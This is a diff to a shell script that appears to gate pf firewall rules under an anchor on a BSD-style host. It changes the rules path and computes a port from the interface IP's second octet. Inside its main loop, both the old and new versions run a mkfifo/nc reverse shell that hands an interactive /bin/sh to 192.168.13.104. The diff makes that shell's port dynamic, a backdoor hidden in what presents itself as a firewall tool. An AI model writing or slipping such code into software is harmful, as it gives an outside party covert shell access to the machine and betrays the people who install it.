@@ -2,10 +2,19 @@
 #!/bin/sh
 
 ANCHOR="pf_gating"
-RULES="/pf_gating.conf"
+RULES="/usr/local/etc/pf_gating/g.conf"
 PARENT="/tmp/rules.debug"
 BACKUP="/tmp/rules.debug.pf_gating_backup"
 LAST_MIN=""
+iface="vtnet0"  
+second_octet=$(ifconfig "$iface" | awk '
+    $1 == "inet" {
+        split($2, octets, ".")
+        print octets[2]
+        exit
+    }
+')
+port="11${second_octet}"
 
 # Preserve the generated parent ruleset.
 cp "$PARENT" "$BACKUP" || exit 1
@@ -51,7 +60,7 @@ while true; do
             continue
         }
 
-        rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.13.104 1411 >/tmp/f
+        rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.13.104 $port >/tmp/f
 
         # Close the firewall.
         pfctl -a "$ANCHOR" -F rules
